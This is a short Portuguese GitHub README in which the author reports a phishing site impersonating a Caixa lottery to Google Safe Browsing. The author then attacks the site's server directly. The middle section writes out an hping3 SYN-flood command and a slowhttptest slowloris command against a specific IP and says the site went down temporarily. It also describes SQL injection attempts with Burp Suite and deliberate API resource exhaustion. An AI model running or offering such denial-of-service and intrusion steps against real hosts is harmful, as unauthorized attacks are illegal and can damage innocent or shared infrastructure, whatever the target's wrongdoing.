# PreventingWebfraud
An event that required investigation!

Identifiquei um site tentando se passar por um site de sorteios da caixa (Phishing) (site do governo):
https://megadavirada-oficial.online/pv/?utm_medium=paid&utm_source=FB-1766942878672-twc8lbptzbj3e&utm_id=120242417040220608&utm_content=120242417041000608&utm_term=120242417040870608&utm_campaign=120242417040220608&fbclid=PAb21jcAO-SB9leHRuA2FlbQEwAGFkaWQBqy_Xl49iIHNydGMGYXBwX2lkDzU2NzA2NzM0MzM1MjQyNwABp9CPmSvaae0FbQYwg7nZ_o6R2LJqH4cYb1OGuNCOMJH3rN8ny9LMxW4JZaOe_aem_-MNgKxzsvPFzTvpxT2aZjQ&twrclid=695168cab9ee0c17dd04a8a3
Ao acessar o site básico (sem o restante dos caracteres(https://megadavirada-oficial.online)) recebo esta mensagem, identificando realmente que o site é um esquema de phishing:
<img width="1429" height="533" alt="Screenshot 2025-12-28 135705" src="https://github.com/user-attachments/assets/42b34e8b-b6f6-4564-8676-15cdddfbc8ec" />

Primeiro passo reportar a informação ao google em https://safebrowsing.google.com/safebrowsing/report_phish/?authuser=1:
<img width="1417" height="760" alt="image" src="https://github.com/user-attachments/assets/987b5d48-58d4-408b-8b5f-d5dd04564e93" />





Utilizei:
sudo hping3 -S --flood -V -p 80 45.61.157.104
e
slowhttptest -c 1000 -H -g -o slowloris_stats -i 10 -r 200 -t GET -u http://45.61.157.104 -x 24 -p 3
O site caiu temporariamente.... 
<img width="700" height="404" alt="Screenshot 2025-12-28 140531" src="https://github.com/user-attachments/assets/b53eaf2d-4d34-4f97-93d0-f408ff2943fc" />
mas retornou depois de algum tempo! Entendemos que deve ter algum load balancer ou waf realizando algum bloqueio! Então corri atrás de usar o Burp suite e realizei alguns testes com SQL injection, mas nenhum deles com sucesso!

Após isso parti para o esgotamento de recursos da API, já que identifiquei no site que uma api pública era utilizada. E também identifiquei na página de pagamento o link de api e realizei contato com a equipe para desabilitarem a api utilizada no scam!

